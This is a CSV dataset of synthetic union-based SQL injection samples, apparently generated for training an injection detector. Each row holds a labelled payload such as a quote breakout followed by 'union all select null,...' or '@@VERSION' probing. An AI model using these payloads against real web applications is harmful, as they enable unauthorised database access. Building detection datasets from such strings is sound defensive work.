id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000001,attack,union,"1%'   )    )     )   union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000682,0.3728264511413045
SMOTE_000002,attack,union,"-7088'||  (  select 'arol' from dual where 8891  =  8891 union all select 8891,8891,8891,8891,8891,8891,8891,8891#",nearest_attack_euclidean,R000809,0.49632221814986216
SMOTE_000003,attack,union,"-6463""   )    )     )   union all select 3280,3280,3280,3280,3280,3280,3280,3280,3280#",nearest_attack_euclidean,R000830,0.15491172549665455
SMOTE_000004,attack,union,"-1368   )    )    union all select 1310,1310,1310,1310,1310#",nearest_attack_euclidean,R001256,0.2695556977238584
SMOTE_000005,attack,union,1'  )   union all select null#,nearest_attack_euclidean,R000691,0.12859815139041716
SMOTE_000006,attack,union,"-4955%' union all select 5928,5928--",nearest_attack_euclidean,R001097,0.48296255910195773
SMOTE_000007,attack,union,"-5225'   )    )    as zats where 5629  =  5629 union all select 5629,5629,5629,5629,5629--",nearest_attack_euclidean,R000528,0.42681511070499706
SMOTE_000008,attack,union,"-3361'||  (  select 'msfi' where 4806  =  4806 union all select 4806,4806,4806,4806,4806,4806,4806,4806,4806--",nearest_attack_euclidean,R001070,0.8124978366283696
SMOTE_000009,attack,union," select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000030,0.2967614146968578
SMOTE_000010,attack,union,"1'||  (  select 'zvpl' where 5877  =  5877 union all select null,null#",nearest_attack_euclidean,R000742,0.6908387986440993
SMOTE_000011,attack,union,"-6733'  )   where 4024  =  4024 union all select 4024,4024,4024,4024#",nearest_attack_euclidean,R000583,0.15161602713470046
SMOTE_000012,attack,union,"-6368' union all select 6529,6529,6529--",nearest_attack_euclidean,R000580,1.1920928955078125e-07
SMOTE_000013,attack,union,"1' in boolean mode  )   union all select null,null#",nearest_attack_euclidean,R000881,0.14035671825774026
SMOTE_000014,attack,union,"-3819'   )    )     )   union all select 9014,9014,9014,9014,9014,9014--",nearest_attack_euclidean,R000478,0.05044430285569137
SMOTE_000015,attack,union,"1 where 4477  =  4477 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R000707,0.2503262609520778
SMOTE_000016,attack,union,"1"" union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R001639,0.018718564891156482
SMOTE_000017,attack,union,"1 union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000419,0.23439756170272533
SMOTE_000018,attack,union," select * from users where id  =  1 or @`\` union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000197,1.088819544839729
SMOTE_000019,attack,union,"1'+  (  select vupb where 9575  =  9575 union all select null,null,null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R001244,0.4144558757730345
SMOTE_000020,attack,union,"-7296%'   )    )     )   union all select 9322,9322,9322,9322--",nearest_attack_euclidean,R000849,0.506057509239253
